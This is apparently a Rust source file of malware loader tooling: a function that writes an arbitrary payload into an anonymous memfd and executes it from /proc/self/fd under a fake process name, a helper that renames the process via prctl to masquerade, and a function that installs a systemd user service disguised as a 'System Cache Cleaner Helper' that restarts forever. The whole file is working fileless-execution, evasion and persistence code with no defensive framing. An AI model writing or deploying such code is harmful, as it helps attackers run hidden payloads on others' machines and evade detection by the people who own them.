use sc::syscall;
use std::ffi::CString;
use std::io::Write;
use std::os::unix::io::FromRawFd;
use std::fs::File;
use libc::PR_SET_NAME;

pub fn reflective_exec(payload: &[u8], fake_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    let name = "sophia_memfd";
    let name_cstr = CString::new(name).unwrap();

    let fd_res = unsafe { syscall!(MEMFD_CREATE, name_cstr.as_ptr(), 0) };

    if (fd_res as i64) < 0 {
        return Err("memfd_create failed".into());
    }
    let fd = fd_res as i32;

    let mut file = unsafe { File::from_raw_fd(fd) };
    file.write_all(payload)?;

    let path = format!("/proc/self/fd/{}", fd);
    let path_cstr = CString::new(path).unwrap();
    let fake_name_cstr = CString::new(fake_name).unwrap();

    let argv: [*const libc::c_char; 2] = [fake_name_cstr.as_ptr(), std::ptr::null()];
    let envp: [*const libc::c_char; 1] = [std::ptr::null()];

    masquerade(fake_name);

    unsafe {
        syscall!(EXECVE, path_cstr.as_ptr(), argv.as_ptr(), envp.as_ptr());
    }

    Err("execve failed".into())
}

pub fn masquerade(fake_name: &str) {
    let c_name = CString::new(fake_name).unwrap();
    unsafe {
        syscall!(PRCTL, PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
    }
}

pub fn setup_persistence(service_name: &str, binary_path: &str) -> std::io::Result<()> {
    let home = std::env::var("HOME").expect("HOME not set");
    let systemd_dir = format!("{}/.config/systemd/user", home);
    std::fs::create_dir_all(&systemd_dir)?;

    let service_content = format!(
r#"[Unit]
Description=System Cache Cleaner Helper
After=network.target

[Service]
ExecStart={}
Restart=always

[Install]
WantedBy=default.target
"#, binary_path);

    let service_file = format!("{}/{}.service", systemd_dir, service_name);
    std::fs::write(service_file, service_content)?;

    Ok(())
}
